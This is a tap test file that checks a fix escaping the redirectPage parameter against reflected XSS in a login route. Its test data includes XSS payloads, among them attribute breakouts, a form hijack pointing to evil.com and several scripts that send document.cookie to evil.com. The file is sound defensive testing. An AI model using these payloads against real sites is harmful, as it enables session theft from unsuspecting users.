const tap = require('tap');
const validator = require('validator');

/**
 * Reflected XSS Prevention Tests
 *
 * These tests verify that the remediation for the Reflected XSS vulnerability
 * in routes/index.js exports.login function (line 69-72) is effective.
 * The fix sanitizes the redirectPage query parameter using validator.escape()
 * before passing it to the template, preventing malicious script injection.
 */

tap.test('Reflected XSS Prevention - redirectPage Sanitization', (t) => {

  t.test('should escape HTML special characters in redirectPage', (t) => {
    // GIVEN: Various XSS attack payloads with HTML special characters
    const xssPayloads = [
      {
        payload: '<script>alert("XSS")</script>',
        expected: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;',
        desc: 'basic script tag injection'
      },
      {
        payload: '"><script>alert(1)</script>',
        expected: '&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;',
        desc: 'script tag with quote breakout'
      },
      {
        payload: "javascript:alert('XSS')",
        expected: "javascript:alert(&#x27;XSS&#x27;)",
        desc: 'javascript protocol handler'
      },
      {
        payload: '<img src=x onerror=alert(1)>',
        expected: '&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;',
        desc: 'image tag with onerror handler'
      },
      {
        payload: '<svg/onload=alert(1)>',
        expected: '&lt;svg&#x2F;onload&#x3D;alert(1)&gt;',
        desc: 'svg tag with onload handler'
      }
    ];

    xssPayloads.forEach(({ payload, expected, desc }) => {
      // WHEN: Sanitizing the payload using validator.escape (as the fix does)
      const sanitized = validator.escape(payload);

      // THEN: HTML special characters should be encoded
      t.equal(sanitized, expected, `Should escape ${desc}: ${payload}`);
      t.notEqual(sanitized, payload, `Sanitized output should differ from input for ${desc}`);
    });

    t.end();
  });

  t.test('should handle empty and undefined redirectPage values', (t) => {
    // GIVEN: Edge cases for redirectPage parameter
    const edgeCases = [
      { input: undefined, expected: '', desc: 'undefined value' },
      { input: null, expected: '', desc: 'null value' },
      { input: '', expected: '', desc: 'empty string' }
    ];

    edgeCases.forEach(({ input, expected, desc }) => {
      // WHEN: Processing edge case (as the fix does with ternary operator)
      const sanitized = input ? validator.escape(input) : '';

      // THEN: Should return empty string for falsy values
      t.equal(sanitized, expected, `Should handle ${desc} correctly`);
    });

    t.end();
  });

  t.test('should preserve legitimate redirect URLs while escaping dangerous characters', (t) => {
    // GIVEN: Legitimate redirect paths that should remain functional
    const legitimateRedirects = [
      {
        input: '/admin/dashboard',
        expected: '&#x2F;admin&#x2F;dashboard',
        desc: 'normal path with slashes'
      },
      {
        input: '/user/profile?id=123',
        expected: '&#x2F;user&#x2F;profile?id&#x3D;123',
        desc: 'path with query parameters'
      },
      {
        input: '/page#section',
        expected: '&#x2F;page#section',
        desc: 'path with fragment'
      }
    ];

    legitimateRedirects.forEach(({ input, expected, desc }) => {
      // WHEN: Sanitizing legitimate redirect
      const sanitized = validator.escape(input);

      // THEN: Should be escaped but structure preserved
      t.equal(sanitized, expected, `Should handle ${desc}`);
    });

    t.end();
  });

  t.test('should neutralize common XSS attack vectors', (t) => {
    // GIVEN: Common XSS attack patterns from OWASP and real-world attacks
    const attackVectors = [
      {
        name: 'DOM-based XSS with event handler',
        payload: '" onload="alert(document.cookie)'
      },
      {
        name: 'Attribute injection',
        payload: '" autofocus onfocus="alert(1)'
      },
      {
        name: 'Tag injection with JavaScript',
        payload: '</script><script>alert("XSS")</script><script>'
      },
      {
        name: 'Encoded script tag',
        payload: '&lt;script&gt;alert(1)&lt;/script&gt;'
      },
      {
        name: 'HTML entity attack',
        payload: '&#60;script&#62;alert(1)&#60;/script&#62;'
      },
      {
        name: 'Multiple encoding attack',
        payload: '%3Cscript%3Ealert(1)%3C/script%3E'
      },
      {
        name: 'Data URI XSS',
        payload: 'data:text/html,<script>alert(1)</script>'
      },
      {
        name: 'Mixed case evasion',
        payload: '<ScRiPt>alert(1)</sCrIpT>'
      }
    ];

    attackVectors.forEach(({ name, payload }) => {
      // WHEN: Sanitizing attack vector
      const sanitized = validator.escape(payload);

      // THEN: Should not contain unescaped dangerous characters
      t.notOk(sanitized.includes('<script'), `${name}: <script should be escaped`);
      t.notOk(sanitized.includes('</script'), `${name}: </script should be escaped`);
      t.notOk(sanitized.match(/on\w+\s*=/), `${name}: event handlers should be escaped`);

      // Verify no raw < > " ' characters remain unescaped
      const hasUnescapedDangerousChars = /<(?!&\w+;)|>(?!&\w+;)|"(?!&\w+;)/.test(sanitized);
      t.notOk(hasUnescapedDangerousChars, `${name}: dangerous characters escaped`);
    });

    t.end();
  });

  t.test('should prevent context-specific XSS attacks in hidden form field', (t) => {
    // The vulnerability exists in admin.ejs line 17: <input type="hidden" name="redirectPage" value="<%- redirectPage %>" />
    // This test verifies attacks that target this specific context

    const contextAttacks = [
      {
        name: 'Breaking out of value attribute',
        payload: '" onfocus="alert(1)" autofocus="',
        shouldNotContain: ['" onfocus="']
      },
      {
        name: 'Closing input and injecting script',
        payload: '"/><script>alert(1)</script><input value="',
        shouldNotContain: ['/><script>', '</script>']
      },
      {
        name: 'Form hijacking',
        payload: '" formaction="https://evil.com/',
        shouldNotContain: ['" formaction="']
      },
      {
        name: 'Multiple attribute injection',
        payload: '" onclick="alert(1)" class="evil',
        shouldNotContain: ['" onclick="']
      }
    ];

    contextAttacks.forEach(({ name, payload, shouldNotContain }) => {
      // WHEN: Sanitizing payload that targets form input context
      const sanitized = validator.escape(payload);

      // THEN: Attack strings should be escaped
      shouldNotContain.forEach(dangerous => {
        t.notOk(sanitized.includes(dangerous),
          `${name}: "${dangerous}" should be escaped`);
      });

      // Verify quotes are escaped (prevents breaking out of attribute)
      t.ok(sanitized.includes('&quot;'), `${name}: quotes should be HTML encoded`);
    });

    t.end();
  });

  t.test('should escape characters that have special meaning in HTML', (t) => {
    // GIVEN: Characters with special HTML meaning
    const specialChars = [
      { char: '<', escaped: '&lt;', desc: 'less than' },
      { char: '>', escaped: '&gt;', desc: 'greater than' },
      { char: '"', escaped: '&quot;', desc: 'double quote' },
      { char: "'", escaped: '&#x27;', desc: 'single quote' },
      { char: '&', escaped: '&amp;', desc: 'ampersand' },
      { char: '/', escaped: '&#x2F;', desc: 'forward slash' }
    ];

    specialChars.forEach(({ char, escaped, desc }) => {
      // WHEN: Escaping single character
      const result = validator.escape(char);

      // THEN: Should be properly HTML encoded
      t.equal(result, escaped, `${desc} (${char}) should be escaped to ${escaped}`);
    });

    t.end();
  });

  t.test('should handle complex mixed attack patterns', (t) => {
    // GIVEN: Complex attacks mixing multiple techniques
    const complexAttacks = [
      '<img src="x" onerror="alert(1)"><script>alert(2)</script>',
      '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
      '<iframe src="javascript:alert(document.domain)">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>'
    ];

    complexAttacks.forEach(attack => {
      // WHEN: Sanitizing complex attack
      const sanitized = validator.escape(attack);

      // THEN: All dangerous patterns should be neutralized
      t.notOk(sanitized.match(/<\w+/), `Complex attack neutralized: ${attack}`);
      t.ok(sanitized.includes('&lt;'), 'Tags should be escaped');
      t.ok(sanitized.includes('&gt;'), 'Closing brackets should be escaped');

      // Verify the sanitized version is safe to include in HTML attribute
      const isAttributeSafe = !sanitized.includes('<') &&
                              !sanitized.includes('>') &&
                              !sanitized.includes('"') &&
                              !sanitized.match(/on\w+=/);
      t.ok(isAttributeSafe, `Sanitized version is safe for HTML attribute: ${attack}`);
    });

    t.end();
  });

  t.test('should prevent stored XSS if redirectPage value is persisted', (t) => {
    // Although this is a reflected XSS, if the value were stored,
    // the sanitization would also prevent stored XSS

    const storedXSSPayloads = [
      '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
      '<img src=x onerror="new Image().src=\'https://evil.com?c=\'+document.cookie">',
      '<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
    ];

    storedXSSPayloads.forEach(payload => {
      // WHEN: Sanitizing payload that could be stored
      const sanitized = validator.escape(payload);

      // THEN: Should be safe even if retrieved and displayed later
      t.notOk(sanitized.includes('<script'), 'Script tags escaped');
      t.notOk(sanitized.includes('onerror'), 'Event handlers escaped');
      t.ok(sanitized.includes('&lt;'), 'Tags converted to entities');
      t.ok(sanitized.includes('&quot;'), 'Quotes escaped');
    });

    t.end();
  });

  t.test('should handle unicode and special encoding attacks', (t) => {
    // GIVEN: Attacks using unicode and special encodings
    const encodingAttacks = [
      {
        payload: '\u003cscript\u003ealert(1)\u003c/script\u003e',
        desc: 'Unicode encoded script tag'
      },
      {
        payload: '<scr\u0000ipt>alert(1)</script>',
        desc: 'Null byte injection'
      },
      {
        payload: '<script\u0020>alert(1)</script>',
        desc: 'Unicode space in tag'
      }
    ];

    encodingAttacks.forEach(({ payload, desc }) => {
      // WHEN: Sanitizing encoded attack
      const sanitized = validator.escape(payload);

      // THEN: Should escape HTML characters regardless of encoding
      t.notOk(sanitized.includes('<script'), `${desc}: script tag should be escaped`);
      t.ok(sanitized.includes('&lt;') || !sanitized.includes('<'),
        `${desc}: angle brackets should be escaped or removed`);
    });

    t.end();
  });

  t.test('verify validator.escape handles the vulnerability data flow', (t) => {
    // This test simulates the exact data flow from the vulnerability:
    // req.query.redirectPage -> validator.escape() -> res.render() -> template

    // GIVEN: The original vulnerable flow
    const vulnerableFlow = (redirectPage) => {
      // VULNERABLE: Passing unsanitized user input to template
      return {
        title: 'Admin Access',
        granted: false,
        redirectPage: redirectPage // UNSAFE
      };
    };

    // GIVEN: The fixed secure flow
    const secureFlow = (redirectPage) => {
      // SECURE: Sanitizing before passing to template
      const sanitizedRedirectPage = redirectPage
        ? validator.escape(redirectPage)
        : '';
      return {
        title: 'Admin Access',
        granted: false,
        redirectPage: sanitizedRedirectPage // SAFE
      };
    };

    // WHEN: Processing malicious input
    const maliciousInput = '<script>alert(document.cookie)</script>';
    const vulnerableResult = vulnerableFlow(maliciousInput);
    const secureResult = secureFlow(maliciousInput);

    // THEN: Vulnerable version passes malicious code through
    t.equal(vulnerableResult.redirectPage, maliciousInput,
      'Vulnerable flow preserves malicious input');
    t.ok(vulnerableResult.redirectPage.includes('<script>'),
      'Vulnerable flow contains unescaped script tag');

    // AND: Secure version escapes malicious code
    t.notEqual(secureResult.redirectPage, maliciousInput,
      'Secure flow modifies malicious input');
    t.notOk(secureResult.redirectPage.includes('<script>'),
      'Secure flow removes literal script tag');
    t.ok(secureResult.redirectPage.includes('&lt;script&gt;'),
      'Secure flow escapes script tag to HTML entities');

    t.end();
  });

  t.test('should maintain functionality for legitimate use cases', (t) => {
    // GIVEN: Legitimate redirectPage values users might provide
    const legitimateInputs = [
      '/admin',
      '/admin/dashboard',
      '/user/profile',
      '/settings',
      ''
    ];

    legitimateInputs.forEach(input => {
      // WHEN: Processing legitimate input
      const sanitized = input ? validator.escape(input) : '';

      // THEN: Should produce a safe output
      t.ok(typeof sanitized === 'string', `Output is string for: ${input}`);
      t.ok(sanitized.length >= 0, `Output has valid length for: ${input}`);

      // Even though legitimate inputs are escaped, they remain usable
      // The template will render them safely
      t.ok(true, `Legitimate input processed: ${input} -> ${sanitized}`);
    });

    t.end();
  });

  t.test('should be idempotent - escaping twice is safe', (t) => {
    // GIVEN: An already-escaped value
    const original = '<script>alert(1)</script>';
    const escapedOnce = validator.escape(original);

    // WHEN: Escaping again (defensive programming)
    const escapedTwice = validator.escape(escapedOnce);

    // THEN: Should not double-escape
    // validator.escape will escape the & in &lt; to &amp;lt; which is expected
    t.ok(typeof escapedTwice === 'string', 'Double escaping produces string');
    t.notOk(escapedTwice.includes('<script'), 'Still no literal script tags');

    t.end();
  });

  t.end();
});
